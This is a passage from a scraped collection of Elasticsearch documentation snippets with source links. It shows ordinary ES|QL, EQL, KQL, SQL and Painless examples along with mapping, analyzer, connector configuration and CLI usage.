https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/drop.csv-spec/height.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| DROP height\n```\n\n----------------------------------------\n\nTITLE: Generating ESQL Function Type Compatibility Table in Markdown\nDESCRIPTION: This markdown snippet presents a table of supported field types and their corresponding result types for ESQL functions. It includes various data types such as boolean, date, numeric types, geometric types, and others.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_first.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | cartesian_point |\n| cartesian_shape | cartesian_shape |\n| date | date |\n| date_nanos | date_nanos |\n| double | double |\n| geo_point | geo_point |\n| geo_shape | geo_shape |\n| integer | integer |\n| ip | ip |\n| keyword | keyword |\n| long | long |\n| text | keyword |\n| unsigned_long | unsigned_long |\n| version | version |\n```\n\n----------------------------------------\n\nTITLE: Running the Connector Service with Make\nDESCRIPTION: These shell commands are used to install the necessary dependencies and run the Elasticsearch connector service. The `make install` command compiles and installs the dependencies, while `make run` executes the service.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-run-from-source.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n\"make install\nmake run\"\n```\n\n----------------------------------------\n\nTITLE: Creating Data Structure for Elasticsearch in Bash\nDESCRIPTION: Sets up the necessary directory structure for Elasticsearch data, configuration, and snapshots.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nmkdir /tmp/sharedESData\nmkdir /tmp/sharedESData/config\nmkdir /tmp/sharedESData/data\nmkdir /tmp/sharedESData/snapshots\n```\n\n----------------------------------------\n\nTITLE: Querying Significant Terms in Elasticsearch (JSON)\nDESCRIPTION: Example of using significant terms aggregation to find unusual crime types for a specific police force.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"terms\": { \"force\": [ \"British Transport Police\" ] }\n  },\n  \"aggregations\": {\n    \"significant_crime_types\": {\n      \"significant_terms\": { \"field\": \"crime_type\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining NegativeArraySizeException in Java\nDESCRIPTION: This snippet defines the java.lang.NegativeArraySizeException class, thrown if an application tries to create an array with negative size. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_42\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.NegativeArraySizeException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Null Values in Lists with ESQL\nDESCRIPTION: Demonstrates that null values in lists are not preserved at the storage layer in Elasticsearch. The example includes indexing a document with null values in a list and querying it with ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /mv/_doc?refresh\n{ \"a\": [2, null, 1] }\n\nPOST /_query\n{\n  \"query\": \"FROM mv | LIMIT 1\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\", \"type\": \"long\"},\n  ],\n  \"values\": [\n    [[1, 2]],\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Recreating Standard Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to recreate the standard analyzer as a custom analyzer, providing a starting point for further customization. It shows the index creation with a custom analyzer definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-standard-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /standard_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"rebuilt_standard\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\"       <1>\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with typed_keys Parameter\nDESCRIPTION: Example of using the typed_keys parameter in an Elasticsearch search request with term and phrase suggesters. The request includes two suggesters targeting the message field with different suggestion types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_27\n\nLANGUAGE: console\nCODE:\n```\nPOST _search?typed_keys\n{\n  \"suggest\": {\n    \"text\" : \"some test mssage\",\n    \"my-first-suggester\" : {\n      \"term\" : {\n        \"field\" : \"message\"\n      }\n    },\n    \"my-second-suggester\" : {\n      \"phrase\" : {\n        \"field\" : \"message\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Persian Stop Words\nDESCRIPTION: Defines Persian stop words for use in Elasticsearch text analysis, referenced from the Lucene resource.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_30\n\nLANGUAGE: markdown\nCODE:\n```\n`_persian_`\n:   [Persian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/fa/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: EQL Sample Query Example\nDESCRIPTION: Sample query to find unordered event patterns sharing the same host value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_24\n\nLANGUAGE: eql\nCODE:\n```\nsample by host\n  [ file where file.extension == \"exe\" ]\n  [ process where true ]\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Function Parameters for Coordinate Operations\nDESCRIPTION: This snippet defines the parameters for an ESQL function that works with x and y coordinates. It specifies that both parameters are nullable and explains the function's behavior when null values are provided.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/atan2.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`y_coordinate`\n:   y coordinate. If `null`, the function returns `null`.\n\n`x_coordinate`\n:   x coordinate. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Low Precision Geohex Grid Query in Elasticsearch\nDESCRIPTION: Example showing basic geohex grid aggregation with precision level 4. Creates an index for museums, adds sample location data, and performs a grid aggregation returning hexagonal cell buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohexgrid-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (4.912350 52.374081)\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (4.901618 52.369219)\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (4.914722 52.371667)\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (4.405200 51.222900)\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (2.336389 48.861111)\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (2.327000 48.860000)\", \"name\": \"Musée d'Orsay\"}\n\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"large-grid\": {\n      \"geohex_grid\": {\n        \"field\": \"location\",\n        \"precision\": 4\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Whitespace Tokenizer Using Elasticsearch Console\nDESCRIPTION: This snippet shows how to use the 'whitespace' tokenizer to analyze the given text. The tokenizer breaks text into terms whenever it encounters a whitespace character. This operation requires Elasticsearch to be running.\n\nKey parameters:\n- tokenizer: Specifies the tokenizer to use ('whitespace').\n- text: The input string to be tokenized.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-whitespace-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Stemmer Filter Analysis in Elasticsearch\nDESCRIPTION: Example showing token stemming without keyword marking, using the stemmer filter on the text 'fox running and jumping'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-marker-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [ \"stemmer\" ],\n  \"text\": \"fox running and jumping\"\n}\n```\n\n----------------------------------------\n\nTITLE: Lat-Lon Properties Geo Sort in Elasticsearch\nDESCRIPTION: Demonstrates geo-distance sorting using latitude and longitude as separate properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\" : [\n    {\n      \"_geo_distance\" : {\n        \"pin.location\" : {\n          \"lat\" : 40,\n          \"lon\" : -70\n        },\n        \"order\" : \"asc\",\n        \"unit\" : \"km\"\n      }\n    }\n  ],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Fill Mask Inference Processor Configuration\nDESCRIPTION: Configuration options for Fill Mask inference processor including num_top_classes, results_field, and tokenization settings. Supports various tokenization styles including BERT, DeBERTa, MPNet, RoBERTa, and others.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"num_top_classes\": 0,\n  \"results_field\": \"<dependent_variable>_prediction\",\n  \"tokenization\": {\n    \"bert\": {\n      \"truncate\": \"first\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Boolean XOR: Painless Example\nDESCRIPTION: Demonstrates the use of the XOR operator with boolean types in Painless. It calculates the XOR result, which returns true if one input is true and the other false. Inputs should be boolean values, and the result is a boolean.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_29\n\nLANGUAGE: Painless\nCODE:\n```\nboolean x = false;\nboolean y = x ^ true;\ny = y ^ x;\n```\n\n----------------------------------------\n\nTITLE: Percolate Query for Suffix Search in Elasticsearch\nDESCRIPTION: A search request using the percolate query to find matching percolator queries for a given document. This demonstrates how the optimized suffix matching works with the reversed tokens approach.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nGET /my_queries2/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"document\": {\n        \"my_field\": \"wxyz\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sharing Reference Type Instances in Painless\nDESCRIPTION: Illustrates how multiple variables can refer to the same reference type instance (shallow copy). When one reference adds elements, they're accessible through all references to the same instance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nList l0 = new ArrayList();     <1>\nList l1 = l0;                  <2>\nl0.add(1);                     <3>\nl1.add(2);                     <4>\nint i = l1.get(0) + l0.get(1); <5>\n```\n\n----------------------------------------\n\nTITLE: Testing Log Function with Base 2 in ESQL\nDESCRIPTION: This SQL query tests the log function with base 2 for various input values. It covers positive numbers, zero, and negative numbers, demonstrating the function's behavior and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/log.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    log(2, null::LONG) AS null_long,\n    log(2, null::DOUBLE) AS null_double,\n    log(2, null::INTEGER) AS null_integer,\n    log(2, 1) AS one,\n    log(2, 2) AS two,\n    log(2, 4) AS four,\n    log(2, 0.5) AS half,\n    log(2, 0) AS zero,\n    log(2, -1) AS negative;\n```\n\n----------------------------------------\n\nTITLE: Multi-Value Sparse Vectors Example in Elasticsearch\nDESCRIPTION: This example demonstrates how to work with multi-value sparse vectors in Elasticsearch. It shows index creation, document insertion with overlapping feature names across vectors, and querying. The example illustrates how max values of overlapping feature names are stored in multi-value sparse vectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/sparse-vector.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"analyzer\": \"standard\"\n      },\n      \"impact\": {\n        \"type\": \"sparse_vector\"\n      },\n      \"positive\": {\n        \"type\": \"sparse_vector\"\n      },\n      \"negative\": {\n        \"type\": \"sparse_vector\"\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_doc\n{\n    \"text\": \"I had some terribly delicious carrots.\",\n    \"impact\": [{\"I\": 0.55, \"had\": 0.4, \"some\": 0.28, \"terribly\": 0.01, \"delicious\": 1.2, \"carrots\": 0.8},\n               {\"I\": 0.54, \"had\": 0.4, \"some\": 0.28, \"terribly\": 2.01, \"delicious\": 0.02, \"carrots\": 0.4}],\n    \"positive\": {\"I\": 0.55, \"had\": 0.4, \"some\": 0.28, \"terribly\": 0.01, \"delicious\": 1.2, \"carrots\": 0.8},\n    \"negative\": {\"I\": 0.54, \"had\": 0.4, \"some\": 0.28, \"terribly\": 2.01, \"delicious\": 0.02, \"carrots\": 0.4}\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"impact\": {\n         \"value\": \"delicious\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the 'cidrMatch' Function in EQL for Elasticsearch\nDESCRIPTION: The 'cidrMatch' function returns true if an IP address is contained in one or more provided CIDR blocks. It supports both IPv4 and IPv6 addresses and handles null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_2\n\nLANGUAGE: eql\nCODE:\n```\n// source.address = \"192.168.152.12\"\ncidrMatch(source.address, \"192.168.0.0/16\")               // returns true\ncidrMatch(source.address, \"192.168.0.0/16\", \"10.0.0.0/8\") // returns true\ncidrMatch(source.address, \"10.0.0.0/8\")                   // returns false\ncidrMatch(source.address, \"10.0.0.0/8\", \"10.128.0.0/9\")   // returns false\n\n// null handling\ncidrMatch(null, \"10.0.0.0/8\")                             // returns null\ncidrMatch(source.address, null)                           // returns null\n```\n\n----------------------------------------\n\nTITLE: Querying Nested Fields in YAML Using KQL\nDESCRIPTION: This snippet provides guidance on querying nested fields using KQL with appropriate syntax. It includes examples with single and nested fields to illustrate the full path required for these queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nuser:{ first: \"Alice\" and last: \"White\" }\n```\n\nLANGUAGE: yaml\nCODE:\n```\nuser.names:{ first: \"Alice\" and last: \"White\" }\n```\n\n----------------------------------------\n\nTITLE: Removing Index Settings\nDESCRIPTION: Shows how to remove problematic index settings that might prevent cluster formation. Includes examples of removing specific settings and using wildcards.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_6\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node remove-index-settings index.my_plugin.foo\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nYou should only run this tool if you have incompatible index settings in the\ncluster state that prevent the cluster from forming.\nThis tool can cause data loss and its use should be your last resort.\n\nDo you want to proceed?\n\nConfirm [y/N] y\n\nIndex settings were successfully removed from the cluster state\n```\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node remove-index-settings index.my_plugin.*\n```\n\n----------------------------------------\n\nTITLE: SQL DESCRIBE Table Example Output\nDESCRIPTION: Example output of DESCRIBE command showing column details including column names, data types, and their corresponding Elasticsearch mappings for an employee table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-describe-table.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nDESCRIBE emp;\n\n       column       |     type      |    mapping\n--------------------+---------------+---------------\nbirth_date          |TIMESTAMP      |datetime\ndep                 |STRUCT         |nested\ndep.dep_id          |VARCHAR        |keyword\ndep.dep_name        |VARCHAR        |text\ndep.dep_name.keyword|VARCHAR        |keyword\ndep.from_date       |TIMESTAMP      |datetime\ndep.to_date         |TIMESTAMP      |datetime\nemp_no              |INTEGER        |integer\nfirst_name          |VARCHAR        |text\nfirst_name.keyword  |VARCHAR        |keyword\ngender              |VARCHAR        |keyword\nhire_date           |TIMESTAMP      |datetime\nlanguages           |TINYINT        |byte\nlast_name           |VARCHAR        |text\nlast_name.keyword   |VARCHAR        |keyword\nname                |VARCHAR        |keyword\nsalary              |INTEGER        |integer\n```\n\n----------------------------------------\n\nTITLE: Optimized Term Query for Percolator in Elasticsearch\nDESCRIPTION: An optimized version of the wildcard query using a term query against the edge_ngram field. This approach is more efficient for the percolator to process compared to wildcard queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT /my_queries1/_doc/1?refresh\n{\n  \"query\": {\n    \"term\": {\n      \"my_field.prefix\": \"abc\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring index routing allocation filter in Elasticsearch\nDESCRIPTION: Illustrates how to add a routing allocation filter to an index using the Elasticsearch API. This example allocates shards from the 'test' index to either 'big' or 'medium' nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/shard-allocation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT test/_settings\n{\n  \"index.routing.allocation.include.size\": \"big,medium\"\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Doc Values in Elasticsearch Mappings\nDESCRIPTION: Example demonstrating how to disable doc values for fields where sorting, aggregation, and script access aren't needed. Shows configuration for both default doc values and explicitly disabled doc values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/doc-values.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"status_code\": {\n        \"type\":       \"keyword\"\n      },\n      \"session_id\": {\n        \"type\":       \"keyword\",\n        \"doc_values\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Port in Elasticsearch YAML\nDESCRIPTION: Sets the SMTP server port to connect to. Defaults to port 25 if not specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.port\n```\n\n----------------------------------------\n\nTITLE: Regression Inference Processor Configuration\nDESCRIPTION: Configuration options for Regression inference processor, including results_field and feature importance settings. Supports specifying the number of top feature importance values to calculate per document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"results_field\": \"<dependent_variable>_prediction\",\n  \"num_top_feature_importance_values\": 0\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Norwegian Stop Words\nDESCRIPTION: Lists Norwegian stop words applicable for Elasticsearch analysis, linking to the corresponding Lucene source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_29\n\nLANGUAGE: markdown\nCODE:\n```\n`_norwegian_`\n:   [Norwegian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/norwegian_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Configuring Synonym File in Elasticsearch JSON\nDESCRIPTION: Configures a synonym filter in Elasticsearch by specifying a file path. This method requires the synonyms file to exist at the provided path.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"filter\": {\n    \"synonyms_filter\": {\n      \"type\": \"synonym_graph\",\n      \"synonyms_path\": \"analysis/synonym-set.txt\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Update Configuration for Docker Deployment - Elasticsearch - YAML\nDESCRIPTION: This YAML snippet is a configuration template for deploying the S3 connector with Docker. It includes settings for the Elasticsearch host, API key, and connector ID. The configuration should be updated according to the environment specifics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: s3\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Removing Leading and Trailing Whitespaces with TRIM in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the TRIM function in ESQL to remove leading and trailing whitespaces from string values. It processes two fields, 'message' and 'color', applying TRIM to both.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/trim.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"   some text  \",  color = \" red \"\n| EVAL message = TRIM(message)\n| EVAL color = TRIM(color)\n```\n\n----------------------------------------\n\nTITLE: Using LEAST Function in ESQL\nDESCRIPTION: Demonstrates how to use the LEAST function to find the minimum value between two columns 'a' and 'b'. The function compares the values and returns the smaller one, storing the result in column 'l'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/least.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 10, b = 20\n| EVAL l = LEAST(a, b)\n```\n\n----------------------------------------\n\nTITLE: Using Built-in Tag Schema for Highlighting in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the built-in 'styled' tag schema for highlighting. This provides a predefined set of highlighting tags without needing to specify each tag individually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"tags_schema\" : \"styled\",\n    \"fields\" : {\n      \"comment\" : {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules in Elasticsearch JavaScript\nDESCRIPTION: This set of rules illustrates indexing strategies focusing on ownership with exception for certain extensions, as well as recursive directory patterns. Effective JSON configuration is vital for functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"owners\": [\"user1-domain@onmicrosoft.com\", \"user2-domain@onmicrosoft.com\"],\n    \"skipFilesWithExtensions\": [\".md\"]\n  },\n  {\n    \"parentPathPattern\": \"/drive/root:/abc/**\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: ES|QL Function Named Parameters\nDESCRIPTION: Example of using named parameters in a match function with REST API query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_6\n\nLANGUAGE: esql\nCODE:\n```\nFROM library\n| WHERE match(author, \"Frank Herbert\", {\"minimum_should_match\": 2, \"operator\": \"AND\"})\n| LIMIT 5\n```\n\n----------------------------------------\n\nTITLE: Extracting Date Parts in SQL\nDESCRIPTION: The DATE_PART/DATEPART function extracts a specified unit from a date or datetime value. It supports various units like year, month, day, hour, etc., and returns an integer value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_48\n\nLANGUAGE: sql\nCODE:\n```\nDATE_PART(\n    string_exp, <1>\n    datetime_exp) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_PART('year', '2019-09-22T11:22:33.123Z'::datetime) AS \"years\";\n\n   years\n----------\n2019\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_PART('mi', '2019-09-04T11:22:33.123Z'::datetime) AS mins;\n\n   mins\n-----------\n22\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_PART('quarters', CAST('2019-09-24' AS DATE)) AS quarter;\n\n   quarter\n-------------\n3\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATE_PART('tzoffset', '2019-09-04T11:22:33.123+05:15'::datetime) AS tz_mins;\n\n   tz_mins\n--------------\n315\n```\n\n----------------------------------------\n\nTITLE: Defining Java Boolean Class\nDESCRIPTION: This snippet defines the Boolean class in Java, providing methods for logical operations, comparison, and string parsing related to boolean values. Key methods include 'booleanValue()', 'compare()', and 'parseBoolean(String)'. This class encapsulates the primitive boolean type and allows for object representation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Boolean {\n  Boolean TRUE\n  Boolean FALSE\n  boolean booleanValue()\n  int compare(boolean,boolean)\n  int compareTo(Boolean)\n  int hashCode(boolean)\n  boolean logicalAnd(boolean,boolean)\n  boolean logicalOr(boolean,boolean)\n  boolean logicalXor(boolean,boolean)\n  boolean parseBoolean(String)\n  String toString(boolean)\n  Boolean valueOf(boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Response from creating extension metadata in Elasticsearch Service\nDESCRIPTION: Sample JSON response after creating extension metadata, containing the extension ID and URL that will be used for uploading the actual file and referencing in deployment plans.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"url\": \"repo://4226448541\",\n    \"version\": \"8.4.3\",\n    \"extension_type\": \"plugin\",\n    \"id\": \"4226448541\",\n    \"name\": \"custom-plugin\"\n}\n```\n\n----------------------------------------\n\nTITLE: Range Querying in YAML Using KQL\nDESCRIPTION: This snippet illustrates how to perform range queries with KQL. It shows how to search for documents with field values below, above, or between specific thresholds, including examples for inclusive ranges, strings, and timestamps.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.response.bytes < 10000\n```\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.response.bytes > 10000 and http.response.bytes <= 20000\n```\n\nLANGUAGE: yaml\nCODE:\n```\n@timestamp < now-2w\n```\n\n----------------------------------------\n\nTITLE: Installing Azure Command-Line Tools\nDESCRIPTION: Command to install the Azure Command-Line Interface (CLI) using npm, which allows for managing Azure resources from the command line.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\nsudo npm install azure-cli -g\n```\n\n----------------------------------------\n\nTITLE: Data Type Mapping Table for ESQL Function\nDESCRIPTION: Markdown table showing the supported input field types and their corresponding result types. Shows that geo_point, geo_shape, keyword, and text fields all map to geo_shape results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_geoshape.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| geo_point | geo_shape |\n| geo_shape | geo_shape |\n| keyword | geo_shape |\n| text | geo_shape |\n```\n\n----------------------------------------\n\nTITLE: Removing Height-Related Columns using ESQL DROP\nDESCRIPTION: ESQL query that removes all columns that match the pattern 'height*' from the employees table. The asterisk acts as a wildcard to match any column names that begin with 'height'.\nSOURCE: 